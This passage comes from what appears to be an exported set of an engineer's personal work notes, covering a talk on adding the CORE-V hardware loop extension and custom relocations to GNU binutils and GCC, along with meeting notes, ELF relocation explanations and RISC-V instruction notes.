this operand. The immediate field refers to a half word address, because instructions are on half word boundaries. We shift it left 1 bit to turn it into a full byte address and the PC is required as the offset is PC relative.\n\n(next slide) (gas/config/tc-riscv.c)\n\nSo now we move on to the gas/config directory, in the file tc-riscv.c, the validate_riscv_insn() function ensures that all bits in the instruction are set. The ENCODE macro, which is defined in the riscv header file, is passed a value of all 1’s. This returns a value with only the bits set by the operand high. This is then OR’d with all the bits set so far. The example on this slide is the loop number, which would only return a value of 1 in the 7th bit position. At the end of this function, all bits in the variable used_bits must be set to 1, otherwise an error will be generated.\n\n(next slide) (gas/config/tc-riscv.c)\n\nIn this same file there is a function called riscv_ip() which assembles an instruction into its binary format. All operands must be added here. In this function you can check that an operand is an acceptable value. This example shows the code for a loop number, as previously explained, a loop number is a constant value of 0 or 1. In this function we check these bounds and the type, if it is not what is expected then we produce an error.\n\nThe main part of this function that does most of the work is INSERT_OPERAND\n\n(next slide) (INSERT OPERAND)\n\nTo ensure that the INSERT_OPERAND macro works correctly, in the riscv header file, a mask for the bits encoded for the operand, and the offset of the encoded bits must be defined. These are used in the INSERT_OPERAND macro along with the instructions opcode, and the actual value of the operand, to produce the instructions binary representation.\n\n(next slide)\n\nNow we are going to go into detail on how we added a relocation to GNU binutils.\n\nThe linker is an important part of binutils. It performs two operations relaxtion, replaced by simpler instruction, and relocation.\n\nRelocations are implemented at link time, so it is tested as part of the linker tests and not assembly.\n\nBefore link time, an instruction might make use of a label, for our example the immediate in cv.starti. The label will then be assigned as a temporary symbolic reference until link time. During link time, the label may change its position as the code is relaxed. Once the actual address is known, the temporary symbolic reference is replaced by the relocated address label.\n\nThe relocation table or howto table – which we will explain in detail later on – stores a list of pointers to the absolute addresses called fixups. These are changed when the loader relocates the code. If a fixup crosses a boundary, an overflow error is flagged by the assembler.\n\n(next slide)\n\nThe CORE-V hardware loop extension has a relocation for cv.starti as you can see. The relocation is used by the 12 bit immediate and refers to the start of the loop. It is PC relative, local and requires a 1 bit left shift.\n\n(next slide)\n\nThe first step to add a new relocation is to add the ELF and BFD relocation types.\n\nThis requires a small change in three files: include/elf/riscv.h, bfd/elfxx-riscv.c and bfd/reloc.c.\n\nEach relocation is assigned a number 0 to 225. The relocation number for this relocation is temporally 224. I will describe later on a issue with this.\n  \n(next slide)\n\nThen, add a description of how the ELF relocation will be handled in bfd/elfnn-riscv.c. The relocation requires a 1 bit left shift which is performed by the ENCODE macro already introduced. The amount to be shifted is recorded in the howto table. Please note that while the howto field is called rightshift, it is a left shift that we are performing and we are saving the amount of bits shifted to this field.\n\n(next slide)\n\nThis is the example of a fixup, a howto table entry. Remember, the relocation is PC relative, and to be left shifted 1 bit. The assembler will throw an error if the relocation overflows using the complain_overflow_unsigned function.\n\n(next slide)\n\nThe final step is to return to tc-riscv.c and add the bfd type to the md_apply_fix function. This will be the function that is called to handle fixups.\n\n-   First it looks up the fixup in the howto table.\n\n(next slide)\n\n- Then it defines target and delta, two variables that alter what is printed at disassembly.\n\n(next slide)\n-   Then it checks for an overflow.\n\n(next slide)\n\n- Finally it removes some of the information from the header records of object files using bfd_putl32.\n\n(next slide)\n\nFor this extension, the relocations have been given temporary numbers. This is because vendor specific linker relocations do not yet have a mechanism to add numbers without maybe stepping on someones toes.\n\nOnly once the relocation numbers have been set in stone can we upstream our work.\n\n(next slide) (TESTING)\n\nNow that we have added an instruction, we come to the most important step; testing. To test the assembler, Binutils has the GAS testsuite. The tests assemble the given input and pattern match the produced disassembly output with the given expected disassembly.\n\nTo add a test for RISC-V, add an assembly file, disassembly file and if the test expects to fail, a .l file.\n\nAn example of a cv.starti input test file is shown on the slide.\n\n(next slide)\n\nThe corresponding output file is shown here. This file starts with hash options defining how to produce the disassembly.\n\nYou can see the assembler options include a march option. This will be discussed in more detail when I explain how to run the assembler. The next line describes the disassembly options, -d for objdump.\n\nThe hash options are followed by the expected disassembly pattern. Since the tests use pattern matching, it is possible to use regular expressions in the tests.\n\n(next slide)\n\nTo test the relocations, Binutils has the LD testsuite. The tests use the same format as the GAS tests, an assembly file, disassembly file and an error file. Except the error output file is now a .ld file. The test must be added to ld-riscv.exp, which will call it.\n\nHere you can see the cv.starti test assembly file.\n\n(next slide)\n\nThis is the start of the corresponding disassembly file. As with the GAS tests, the file starts with hash options which define how to produce the disassembly. The -r disassembler option prints the relocations.\n\n(next slide)\n\nThis is the rest of the disassembly file. As you can see, the labels are printed.\n\n(next slide) (BUILDING)\n\nFinally, we will need to build it. This slide shows the commands I use to build the assembler. I create and enter a binutils build directory. Then, I run configure with a CORE-V specific target. Next, I run make and run the tests with make check-gas and make check-ld.\n\nIf all tests pass use make install to install the assembler to the given install directory.\n\n(next slide)\n\nTo use the assembler, run the command shown on the slide where test.s is your assembly file. The march option tells the assembler that the instructions belong to the 32 bit base integer RISC-V instruction set with the standard multiply and compressed extensions and a CORE-V hardware loop custom extension.\n\nJessica will now tell you about our work with GCC.\n\n(next slide)\n\nGCC\n\nNow we are going to move onto GCC\n\n(next slide)\n\nThe main files we edit are in the gcc/config/riscv directory. In this directory there are some machine description files. The existing RISC-V machine description file can be edited or a new one can be created depending on the types of changes made. The predicates machine description file defines all operand constraints.\n\n(next slide)\n\nIn order to generate the assembly for cv.starti we must define the instruction in a machine description file. For CORE-V we have created a new file specifically for the CORE-V extensions. An example is given on the slide, so let’s break it down...\n\n(next slide)\n\nWhen defining the instruction, a name is given. This will be used to generate a gen function during building. This function can be called to print out the desired assembly with given operands. Note that the operands are numbered, in this example we use 0 and 1, in the order that they will be passed into the gen function.\n\n(next slide)\n\nTo ensure that your new instructions are not optimized out, we declare this as an unspec volatile. This must also be defined in the unspec v enum at the top of the file.\n\n(next slide)\n\nIn order to validate any operands we use match_operand and define a predicate in the predicates machine description file. We have created two new predicates for cv.starti. However this will not be required if your operand matches the constraints in an existing predicate. The example on the slide shows the predicate for a loop number, here we ensure that it is a constant value using match code and is either 1 or 0.\n\n(next slide)\n\nIf the instruction is target specific then we must state this. The cv.starti instruction is specific for CORE-V, therefore we add the CORE-V hardware loop target – this can be left blank if the instruction is not target specific.\n\n(next slide)\n\nFinally we add the desired assembly for the instruction, the cv.starti instruction has two operands loop number indicated by operand 0 and the label or a constant indicated by 1. The percent sign in front of the operand number will print out the actual value of these operands in assembly.\n\n(next slide)\n\nNow we build GCC. GCC is built in two stages; the second build stage uses the first. For now, the most important stage is the first. The build steps are very similar to Binutils; open and enter a build directory, configure, make and make install. The only change is the configure options. This slide shows the configure command used for GCC Stage One.\n\nAfter building stage one, we can use the compiler as is or build Newlib and recompile GCC as a second stage. This would follow same steps, just with different configuration options.\n\n(next slide)\n\nWe identified memcpy as a key function that could benefit from the use of hardware loops. Memcpy is sometimes called when copying data, an example of this is when copying one large structure to another. The slide shows how we defined a hwlp_memcpy instruction in the same format as previously explained.\n\n(next slide)\n\nIn the RISC-V C file we call the gen function of this instruction, passing it the destination and source registers as well as a temporary register that will be used to implement the copy. This is called instead of the generic memcpy when both optimisation is switched on and the target is CORE-V. This is indicated by an -march option of xcorev or xcorevhwlp.\n\n(next slide)\n\nNow that we have shown you how we added the hardware loop extension to GCC, it’s time to show that it works via a demo. The demo will revolve around memcpy.\n\nIn this demo we will be compiling this file. In the command line, we are able to change the value of N and thus the size of the structures copied. For different sizes, the methods used to copy the structures changes. The demonstration will combine the assembler, linker and GCC that we have previously explained. I’ll now hand you over to Mary to run the demonstration.\n\n(DEMO)\n\n(terminal)\n\nFirst I will compile this file with a very low structure size of 4 bytes. As you can see the compiler uses an intrinsic version of the nano Newlib library memcpy function to copy the structure byte by byte.\n\nIf I increase to 12 bytes, you can see that it uses the same method but the code size has ballooned. Any larger will be inefficient.\n\nIf I increase the amount of bytes by 1 to 13, the methods have changed; it now uses the hardware loop built-in function to copy the structures.\n\nThis critical boundary needs to be investigated. For now it uses the same boundary as memcpy. Once we have physical hardware we will be able to test where the best place to put the boundary to improve speed when using hardware loops.\n\nIf I were to run the same command again without hardware loops. Memcpy will be used.\n\nI will compile with 40 byte structures.\n\nNow I will show you how the Binutils assembler and disassembler works. I will assemble the 40 byte file. And then disassemble it.\n\nHere you can see the binary output of the c source file.\n\n(next slide)\n\nThank you Mary. If you just wish to try using the new compiler, you can download a\n\nconvenient pre-built binary from the Embecosm website. You’ll find versions for all the major operating systems, along with links to the source code, scripts to build the tool chain and test results.\n\nBut we’d also encourage you to become developers. You can find out more via the OpenHW Group Mattermost Software, in the GNU Tools channel. You can sign up to the OpenHW SW mailing list and attend our monthly meetings. And finally we’d welcome your pull requests against the development code bases on GitHub.\n\n(next slide)\n\nThank you all very much for listening. Please ask any question.\n\n(final words)","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/corev","presentation"]},"/notes/private/work/parlab":{"title":"Parallel Computing Laboratory","content":"# Parallel Computing Laboratory\n---\nThe Par Lab was a five-year project to advance parallel computing funded by Microsoft and Intel for $10M over 5 years, from 2008 to 2013.

University of Bologna Meeting\n\nThey seem to be working on Immediate Branching\n\nI reported that we finished all testing\n\nJust Nazareno showed up. He finalised all the pulls request for load/store and\nimmediate branch extensions. Now someone can review all the pull requests.\n\nRegarding the other main activity, which is the support of standard lib\nfunctions in Pulp-SDK in other to use the standard function on GV sock. They\nimplemented at least the allocation and reallocation and allocation with memset\nto 0, so calloc, malloc, realloc functions.\n\nJeremy: sbrk and write are what matters when testing Newlib and GCC.\n\nThe starting of this activity they wanted to implement a function using\nintegrating the equal in GV Sock, but after 2 days of work they decided to move\nto integrating their own version of the SDK(?). The allocation works but now\nthey have to implement and support the string functions.\n\nWhat they want to do for PULP is restore a model to support the eCall when\nthe ISS gets an eCall. There is a function to execute the eCall but it wasn't\nvery supported, so it is a work in progress. They want to restore this model\nin order to support the eCall but probably it will take more than one or two\ndays, so at the moment they changed their plan and they are going to integrate\ntheir own version of sbrk.\n\nSemi hosting, when you are operating a simulation on a debug, if someone says\nWRITE for example. Typically when you are debugging the debugger traps and plays\nit out on the console you have the debugger. This is called TargetIO or HostIO\nin GDB. For that to work, when debugging, the simulator needs to be able to\ntell GDB \"Ive done something that will need the hardware\". So to control\nhardware you need to be in Supervisor mode as you don't want users to control it\njust hte OS. So to get there you need a trap, and within RISCV we have something\ncalled EQUAL which is like an internal interrupt. eCall drop into the debugger.\n\nHe's got 2 pull requests to be reviewed.\n\nJeremy: they need to figure out how to do WRITE\n\nThe equivalent of eCall on ARM the debugger doesn't let you trap. So ARM compiles\na special version of the library. In simulation they put a magic sequence of\ninstructions (nop, break, nop). When we hit the break it will be trapped, but then\nthe debugger looks at the instruction before and after and check if they are\nthe magic nops. If they are, then it knows it is not a break but a eCall. This\nis called semi hosting, HostIO.","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/corev"]},"/notes/private/work/projects/corev/2022-06-17-jeremy-relocation-notes":{"title":"2022-06-17 - Jeremy Relocation Notes","content":"end of linker -\u003e introduce the issue of being no mechanism for vendor specific relocation -\u003e discuss issue of relocations, we can do vendor specific but not vendor specific relocations. it boisl that we have the relocs for everyone in the linker, and gcc we have target specific\n\nput more in 4th slide -\u003e talk about corev vendor specific field -\u003e we need to put in there second slide -\u003e vendor specific GNU tools -\u003e we can say this is how we do vendor specific target, later on we are going to talk about when it wont work properly\n\nwe add to linker assembly, we put in insn builtins, and code generation then optimisation \u003c- talk about 4 stages \u003c- we will apply the first 3 for each of those, the optimisation for the future\n\nshow stage1","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/corev"]},"/notes/private/work/projects/corev/2022-08-18":{"title":"2022-08-18","content":"Hello Robin,\n\nThanks for reporting this issue.\n\nWe've taken a look at it and it seems to be an issue with the latest development Newlib that doesn't show up in GCC testing.

I'm wondering if there were any changes to the problem since we last spoke?

Project Overview","content":"## Introduction to the project\n* needed for future psABI meeting\n* eg: in COREV we have custom relocations that live in the reserved space, but we need to be able to share that reserved space with other tool chains.\n* we need a way for someone else to also use the space and have tools like the linker process the correct version of that relocation number\n\t\n### The Idea\n* use a second relocation at the same address that would be used for deciding between whether it's a CORE-V relocation or someone else's.\n- `R_RISCV_RELAX` proves that we can have multiple relocations at the same address, its mostly about getting the tools to understand what we want.\n\n### How?\n* using a file following our spec, have the linker correctly resolve CORE-V relocations using the right disambiguating magic number (Simon suspects it is just a howto selection, but he's not sure if anything is needed for relaxation).\n* have GAS generate files for CORE-V following this spec.\n* write the formal spec changes for submitting upstream.\n\n## COREV Relocations\nA compilation of my notes on the relocation handler prototype I've been working on.\n\nMore info on relocations [here](notes/relocations.md).\n\n* `BFD_RELOC_RISCV_CVPCREL_UI12` -\u003e 12bit relocation for 12bit immediates found in *cv.starti* and *cv.endi*. Relocation number = 224.\n\n* `BFD_RELOC_RISCV_CVPCREL_URS1` -\u003e 5bit relocation for the rs1 operand in *cv.setup*. Relocation number = 225.\n\n---\n### Howto Table\n* COREV -\u003e `tc-riscv.c` -\u003e 3341\n\n* *Step 1*: Check that symbol address exists via `fixP→fx_addsy`. If false the case will just break and not go through the following steps.\n* *Step 2*: Uses the howto table to look up the relocation. The howto table can be found in `bfd/elfxx-riscv.c`. The first field uses the table from `include/elf/riscv.h`.\n* *Step 3*: Set the delta and target values to increase objdump readability. Target is the value of the symbol found using `S_GET_VALUE`. Since the symbol is local, it will use `resolve_symbol_value` to find the value. This is called during the final pass over the symbol table to resolve any symbols with complex values. Delta is the PC relative value found via `“target - md_pcrel_from (fixP)”`, where `fixP` is the symbol.\n* *Step 4*: Check if the relocation overflows. `bfd_check_overflow` will return  `bfd_reloc_ok` or `bfd_reloc_overflow`. If overflow, as_fatal will be used, ending the assembly.\n\n```cpp\nbfd_reloc_status_type bfd_check_overflow\n(enum complain_overflow how, // howto-\u003ecomplain_on_overflow\nunsigned int bitsize, // Relocation has bitsize significant bits\nunsigned int rightshift, // This relocation requires right shift by 1 (common)\nunsigned int addrsize, // Machine has addrsize significant bits\nbfd_vma relocation); // The relocation found in the howto table\n```\n\n* *Step 5*: Remove some of the information from the header records of object files using bfd_putl32. The function masks to remove the information.\n\n```cpp\nvoid\nbfd_putl32 (bfd_vma data, void *p) {\nbfd_byte *addr = (bfd_byte *) p;\naddr[0] = data \u0026 0xff;\naddr[1] = (data \u003e\u003e 8) \u0026 0xff;\naddr[2] = (data \u003e\u003e 16) \u0026 0xff;\naddr[3] = (data \u003e\u003e 24) \u0026 0xff;\n}\n```\n\n* Changed files:\n  * `bfd/elfxx-riscv.c`: Describe the relocation in the howto table. Define `ENCODE_ITYPE_IMM` mask.\n  * `include/elf/riscv.h`: Add the relocation number.\n  * `bfd/bfd-in2.h`: Regenerate.\n  * `bfd/elfnn-riscv.c`: Add relocation mask (eg `ENCODE_ITYPE_IMM` for 12 bit immediate).\n  * `bfd/reloc.c`: Add relocation BFD name.\n\n* `fixp`: The relocs associated with the instruction, if any. `fixS *fixp`.\n\n* Entries:\n```cpp\n  /* Information about an instruction, including its format, operands\n     and fixups.  */\n  struct riscv_cl_insn\n  {\n     /* The opcode's entry in riscv_opcodes.  */\n     const struct riscv_opcode *insn_mo;\n  \n     /* The encoded instruction bits.  */\n     insn_t insn_opcode;\n  \n     /* The frag that contains the instruction.  */\n     struct frag *frag;\n  \n     /* The offset into FRAG of the first instruction byte.  */\n     long where;\n  \n     /* The relocs associated with the instruction, if any.  */\n     fixS *fixp;\n  };\n```\n\nRelated to: [fixups](notes/fixups.md)\n\n---\n### More notes\n* RISCV_RELOCID field -\u003e word32, calculation -\u003e Vendor ID for relocation.\n* Meaning relocations would share their relocation number but have a \"magic\nnumber\" disambiguating (4 billion IDs to use).\n\n* How relaxation does selection:\n\n```cpp\nif (type == R_RISCV_CALL\n        || type == R_RISCV_CALL_PLT)\n      relax_func = _bfd_riscv_relax_call;\n    else if (type == R_RISCV_HI20\n       || type == R_RISCV_LO12_I\n       || type == R_RISCV_LO12_S)\n      relax_func = _bfd_riscv_relax_lui;\n    else if (type == R_RISCV_TPREL_HI20\n       || type == R_RISCV_TPREL_ADD\n       || type == R_RISCV_TPREL_LO12_I\n       || type == R_RISCV_TPREL_LO12_S)\n      relax_func = _bfd_riscv_relax_tls_le;\n    else\n```\n\n* Something similar for RelocID?\n\n```cpp\nint type = ELFNN_R_TYPE (rel-\u003er_info);\n\nif (type == R_RISCV_CVPCREL_UI12) {\n\t// identify as COREV\n}\n```\n\n* Maybe this is how I could get the relocation to accompany:\n \n``` cpp\n/* Replace the R_RISCV_CALL reloc.  */\nrel-\u003er_info = ELFNN_R_INFO (ELFNN_R_SYM (rel-\u003er_info), r_type);\n```\n\n```cpp\nfixP-\u003efx_next-\u003efx_r_type = BFD_RELOC_RISCV_RELOCID;\n```\n\n* The type of expression is controlled by its position in the script file.\nA symbol assigned within a section definition is created relative to the base\nof the section; a symbol assigned in any other place is created as an *absolute\nsymbol*.

The different between them is they have slightly different instructions and Titan is 32-bits while Cronus is 16.\n\n* Using more than one namespace is bad, use `using`.\n\n* We need to find where we need to modify things so we can know whether we are  in Titan or Cronus.\n\n* How to get the Subtarget is the big question. `setupMCInfo` is the wrapper for all the setup. \n\n* Here is us setting up the Subtarget: `STI = target-\u003ecreateMCSubtargetInfo(triple.getTriple(), \"\", \"\");`\n\n  Note: the empty strings might be the CPU and features.\n\n* In STI there might be a field to create the Titan subtarget.\n\n* The SystemC wrapper that initialises the Simulator.\n\n* About the getter for reg: it returns a 32-bit value, we can't have it  overload. We could ignore the top 16-bits for Titan or have some clever thing that will tell the API.\n\n* What does the Sim look like?\n\nWe have a single top-level simulator entity. We could have BSCSimulator, BSCSimulatorTitan, BSCSimulatorCronus? Maybe make it templated by the register size? Where BSCSimulator actually becomes templated by the size and becomes a template class. Jeremy doesn't know what the answer is for this. It might be helpful to template it with a number of parameters which could be the type of  the registers. Then when we instantiate code it will pass the CPU in as we will have to distinguish between Titan and TinyTitan, and Cronus.\n\n* Need to consider the difference in instruction classes, that is what makes templating harder.\n\n* When we get to things like complete the store, do we have the same store instructions? We might need to put a fatal error there. Look at the load values depending on the architecture, they might be different. \n\n* Complete instructions is the interesting bit. We will need to tell what architecture we are at. Some functions might be completely different, others might be the same.\n\n* We might have issues when we start doing MUL for example, it might differ between architectures. Instead of doing 32-bit arithmetic we will do 16-bit arithmetic.\n\n* Regs are setup as 32-bit. The only thing is that if we decide to template, we will need to template the register class by the register size.\n\n* The MemoryBlock class is used when we're not using SystemC. We have DMright (32bit write to memory), DMW (write initiate) which is 16-bit. He suspects we will need a new memoryBlock for Titan as we don't have the 32-bit reads and writes.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["work/tiger"]},"/notes/private/work/projects/tiger/tiger-hub":{"title":"Tiger","content":"## Cheatsheet Notes\n```dataview\ntable without ID\nfile.link as \"Link\", file.ctime as \"Created Time\"\nfrom #work/tiger \nWHERE type = \"cheatsheet\"\nsort file.ctime desc\n```\n## Related Notes\n```dataview\ntable without ID\nfile.link as \"Link\", file.ctime as \"Created Time\"\nfrom #work/tiger \nWHERE type != \"report\"\nWHERE type != \"meeting\"\nWHERE type != \"hub\"\nsort file.ctime desc\n```\n\n## Minutes\n```dataview\ntable without ID\nfile.link as \"Link\", file.ctime as \"Created Time\"\nfrom #work/tiger\nWHERE type = \"meeting\"\nsort file.ctime desc\n```\n\n## Reports\n```dataview\ntable without ID\nfile.link as \"Link\", file.ctime as \"Created Time\"\nfrom #work/tiger\nWHERE type = \"report\"\nsort file.ctime desc\n```","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["work/tiger"]},"/notes/private/work/relocations":{"title":"Relocations","content":"---\n```toc\n```\n---\nDifferent programs will be different sizes, so when the shared library gets mapped into the address space of different programs, it will be at different addresses. This in turn means that all of the functions and variables in the library are in different places. \n\nNow, if all of the ways of referring to addresses are relative (\"the value +1020 bytes from here\") rather than absolute (\"the value at `0x102218BF`\") this is less of a problem, but this isn't always possible. If not, then all of these absolute addresses need to have a suitable offset added to them — this is relocation.\n\n## What are relocations?\nSymbolic references and symbolic definitions have to be connected with one another. The mechanism to connect them is what is known as relocations.\n\nA relocation can be thought of as a note that a particular address will need to be fixed at load time. Before the code is ready to run you will need to go through and read all the relocations and fix the addresses it refers to to point to the right place.\n\nFor example, we have a program that adds the value of two global variables together. In order for them to be successfully referenced, their address have to resolved. Or for example if the program is calling a function from an external dependency, the address of that function will also have to be computed prior to transferring control of execution to it.\n\nDuring compilation, there is a specific stage were relocatable objects are generated. They contain all the information required to map symbolic references to its corresponding definitions. Populating symbolic references on symbolic definitions takes place during the linking phase of the compilation process.\n\nCompilation process:\n\n![Pasted image 20220802100501](notes/images/Pasted%20image%2020220802100501.png)\n\nWe can relocate:\n\n- Generic object files (`*.o`)\n- Kernel object files (`*.ko`)\n- Shared object files (`*.so`)\n\nGeneric object files are the ones used for static linking, they are only relevant in the compilation process and essentially, any given symbolic definition will become part of the main executable being generated.\n\nSome of the benefits are that there is no need to rely on external dependencies. On the other hand, they can become pretty large as they need all of the dependencies in the binary.\n\nShared objects support being linked on runtime, and they may be shared across different processes. However, relocations of dynamic dependencies have to be done at runtime -\u003e [**dynamic linking**](notes/private/work/linker.md).\n\nThey happen at runtime because the symbolic definitions do not exist within the main binary's context, but within external shared objects. These dynamic references do not get populated until the correspondent external dependencies are loaded in memory.\n\n## Relocation Entries\nRelocation information is held in relocatable entries, located in specific relocation sections within the ELF object. They are implemented in the form of structures, there are two different ones: `Elfxx_Rel` and `Elfxx_Rela`:\n\n![Pasted image 20220802101452](notes/images/Pasted%20image%2020220802101452.png)\n\nThe only different is that `Rela` has an extra field for the addend. They are mutually exclusive, meaning only one type of entry is used.\n\nNormally the type of entry is architecture dependant, for example in x86 `Elf32_Rel` is used whereas for `x86_64` they use `Elf64_Rela`.\n\nWhat do the fields mean?\n\n- `r_offset`: holds the location where a particular relocation has to take place, address to fix.\n- `r_info`: both the symbol index within a symbol table of the correspondent symbol that has to be relocation and the relocation type for that specific symbol. What has to be done to fix this code up, a \"fix-up\". They are retrieved using macros like:\n\n```c\nELF32_R_SYM(info)((info)\u003e\u003e8)\nELF32_R_TYPE(info)((unsigned char)(info))\n```\n\n- `r_addend`: a constant addend to be added to compute the value to be stored in a given relocation reference. For example, if the relocation is for symbol `i` because the original code is doing something like `i[8]`, the addend will be set to 8. This means: find address of i and go 8 past it.\n\nRelocation entries are always found in some relocation section, every relocation section may reference two additional sections:\n\n- A relocation section will always be linked to its corresponded symbol table. The table can be located as a section in the section header table, and its index can be retrieved by the `sh_link` field of the relocation section's `Elfxx_Shdr` instance.\n- The section index where to apply the offset can be retrieved by the relocation section's `Elxx_Shdr sh_info` field.\n\n![Pasted image 20220802102836](notes/images/Pasted%20image%2020220802102836.png)\n\nAs you can see, the relocation section is linked to two other sections. One of them is the symbol table, where the symbols that will be relocated are held. In this example, the section is the `.dynsym` section, the symbol table that holds symbols for dynamic linking.\n\nThe additional section linked to the relocation section is where the relocations are going to take place: the **.got.plt** section, which holds a table of pointers (an interface for the application to access relocated dynamically linked procedures addresses).\n\n## Relocation Types\n`r_info` of `Elfxx_Rela` and `Elfxx_Rel` contains two encoded values, which are the **symbol index** where the relocation is being applied to and the **relocation type** to apply. \n\n## RISC-V Relocations\nCan be found [here](https://github.com/riscv-non-isa/riscv-elf-psabi-doc/blob/master/riscv-elf.adoc).\n\n### Implementation (Practical)\n#### Important Commands\n```bash\nriscv32-unknown-elf-as -march=rv32i -o \u003cfile\u003e.o \u003cfile\u003e.s\nriscv32-unknown-elf-gcc -march=rv32i -Os -c \u003cnewfile\u003e.c\nriscv32-unknown-elf-gcc -o \u003cnewfile\u003e.c \u003cnewfile\u003e.o \u003cfile\u003e.o\n```\n\n- `-c` stops the compiler before link time, the third command links the object files together.\n\n#### Where are the relocations?\nThey can be found in:\n\n```bash\nbfd/elfxx-riscv.c # -\u003e describes the relocation in the howto table\nbfd/elfnn-riscv.c # -\u003e add relocation mask \nbfd/reloc.c # -\u003e add the relocation BFD name\ninclude/elf/riscv.h # -\u003e add the relocation number\ngas/config/tc-riscv.c # -\u003e where the magic happens\n```\n\nIf we use the CORE-V relocations as an example, we have `BFD_RELOC_RISCV_CVPCREL_UI12`, which is a 12-bit relocation for 12-bit immediates found in `cv.starti` and `cv.endi`. Its relocation number is 224.\n\nYou can find the [**howto** table](notes/private/work/howto-table.md) in `bfd/elfxx-riscv.c` which contains entries for each relocation. The first field uses the table from `include/elf/riscv.h`.\n\n#### Howto Table (notes on how CORE-V relocation was implemented)\n**Step 1:** Check that symbol address exists via _fixP→fx_addsy_. If false the case will just break and not go through the following steps.\n\n**Step 2:** Uses the howto table to look up the relocation. The howto table can be found in _**bfd/elfxx-riscv.c**_. The first field uses the table from _**include/elf/riscv.h**_.\n\n**Step 3:** Set the _delta_ and _target_ values to increase objdump readability.\n\nTarget is the value of the symbol found using _S_GET_VALUE_. Since the symbol is local, it will use _resolve_symbol_value_ to find the value. This is called during the final pass over the symbol table to resolve any symbols with complex values.\n\nDelta is the PC relative value found via “_target - md_pcrel_from (fixP)”_, where fixP is the symbol.\n\n**Step 4:** Check if the relocation overflows. _bfd_check_overflow_ will return _bfd_reloc_ok_ or _bfd_reloc_overflow_. If overflow, _as_fatal_ will be used, ending the assembly.\n\n```\nbfd_reloc_status_type bfd_check_overflow\n    (enum complain_overflow how, // howto-\u003ecomplain_on_overflow\n    unsigned int bitsize, // Relocation has bitsize significant bits\n    unsigned int rightshift, // This relocation requires right shift by 1 (common)\n    unsigned int addrsize, // Machine has addrsize significant bits\n    bfd_vma relocation); // The relocation found in the howto table\n```\n\n**Step 5:** Remove some of the information from the header records of object files using _bfd_putl32_. The function masks to remove the information.\n\n```\nvoid\nbfd_putl32 (bfd_vma data, void *p) {\n    bfd_byte *addr = (bfd_byte *) p;\n    \n    addr[0] = data \u0026 0xff;\n    addr[1] = (data \u003e\u003e 8) \u0026 0xff;\n    addr[2] = (data \u003e\u003e 16) \u0026 0xff;\n    addr[3] = (data \u003e\u003e 24) \u0026 0xff;\n}\n```\n\n---\n## References\n- https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/\n- https://github.com/riscv-non-isa/riscv-elf-psabi-doc/blob/master/riscv-elf.adoc#reloc-table\n- https://www.intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/\n- https://man7.org/linux/man-pages/man8/ld.so.8.html\n- https://codywu2010.wordpress.com/2014/11/29/about-elf-pie-pic-and-else/\n- http://bottomupcs.sourceforge.net/csbu/x3824.htm\n- https://www.sifive.com/blog/all-aboard-part-2-relocations\n\n## Related Notes\n- [Linker](notes/private/work/linker.md)\n- [Howto Table](notes/private/work/howto-table.md)\n- [PLT and GOT](notes/private/work/plt-and-got.md)\n- [Linker Relaxation](notes/general/linker-relaxation.md)\n- [Jump Table](notes/private/work/jump-table.md)\n- [Assembler](notes/private/work/riscv-assembler-reference.md)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["help","cs/relocations"]},"/notes/private/work/relocations-corev":{"title":"Relocations - COREV","content":"# Relocations - COREV\n---\nwhat is complain and overflow?\n\nhowto_table in bfd/elfxx-riscv.c\n\nwhat is size?\nbitsize?\npc relative is a pc relative rellocation\n\nthey need to know what to put in each one\n\nit looks up in the table, what does every field mean?\n****************************************************************************************\nassembly notes:\nallocatable -\u003e goes into real memory\n\nsymbol table are not allocatable, they are just sections with useful information\n\nnop -\u003e does nothing -\u003e x0 is always 0, add x0, x0, x0 is a perfectly valid nop\n\n## RELOCATION\n\nConceptually, the linker merges one or more relocatable files to form the output.

JAL stores the address of the instruction following the jump (pc+4) into register rd. The standard software calling convention uses x1 as the return address register and x5 as an alternate link register.\n\nJALR -\u003e jumper and link register -\u003e the target address is obtained by adding the sign-extended 12-bit I-immediate to the register rs1, then setting the least_significant bit of the result to zero. The address of the instruction following the jump (pc+4) is written to resgister rd. Register x0 can be used as the destination if the result is not required.i\n\nLeast significant bit is the lowest bit in a series of numbers, it is either the leftmost or rightmost. If the LSB is on the right, the architecture is \"little endian\". If it is on the left, big endian. For example, in a little endian the LSB of 00000001 is 1.\n\nLUI (load upper immediate)\nAUIPC (add upper immediate to pc)\n\na word is 32 bits (4 bytes)\nzero-extend -\u003e pad with zeros\n\nif the symbol and the call site are not in the same compile unit, then compiler doesn't know the symbol offsets. AUIPC and JALR pair will be generated to guarantee the function call can reach the symbol. Linker knows the symbol address if its a static linker, can transfer the pair to a single JAL.\n\nThe linker rewrites offsets according to relocation records\n\nThe relocation record contains info like: which instructions need to be relocated (the offsets), which symbols are involved with the reloc and how to relocate the files relative to the symbols.\n\nSo the type (R_RISCV_32) tells how to relocate the field relative to symbols.\n\nSymbol can be something like bar + 0 (symb name + addend)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["work"]},"/notes/private/work/riscv":{"title":"RISC-V","content":"# RISC-V\n---\n- [Introduction to RISC-V](notes/private/work/introduction-to-riscv.md)\n- [RISC-V Assembler Reference](notes/private/work/riscv-assembler-reference.md)\n\n## Instruction Set\n![riscv-cheatsheet-is](notes/images/riscv-cheatsheet-is.png)\n\n![](https://miro.medium.com/proxy/1*AQgZssKpktAWuAYIAYecqA.png)\n\n## Reference\n- RISC-V IS Cheatsheet ([here](https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8))\n- RISC-V ASM Cheatsheet ([here](https://michaeljclark.github.io/asm.html))\n- RISC-V Assembly for Beginners ([here](https://medium.com/swlh/risc-v-assembly-for-beginners-387c6cd02c49))\n- RISC-V Assembly Code Examples ([here](https://erik-engheim.medium.com/risc-v-assembly-code-examples-7bca0e7ebaa3))","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["work/engineer-training"]},"/notes/private/work/riscv-assembler-reference":{"title":"RISC-V Assembler Reference","content":"---\n```toc\n```\n\nThis document gives an overview of 